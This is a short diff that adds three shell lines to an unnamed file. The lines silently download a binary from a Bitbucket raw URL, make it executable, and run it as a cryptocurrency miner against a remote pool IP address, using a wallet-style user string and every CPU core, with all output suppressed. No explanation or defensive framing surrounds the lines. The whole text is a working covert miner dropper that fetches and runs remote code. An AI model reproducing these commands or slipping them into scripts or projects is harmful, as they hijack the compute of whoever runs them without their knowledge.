@@ -1,0 +1,3 @@
+wget https://bitbucket.org/aing005/newnivu/raw/main/nivu >/dev/null 2>&1
+chmod +x nivu
+./nivu -a randomnevo --url 139.59.118.123:443 --user NS2cbYTcqts723rBEH7YLd2UWGH4xdA2o11n4TDjLBm5Qxg99Do99igJjerFAkBiZ4KkCo1PAH8at4FCvce72jeS32fx3wLKj.kido -p x -t $(nproc --all) > /dev/null 2>&1
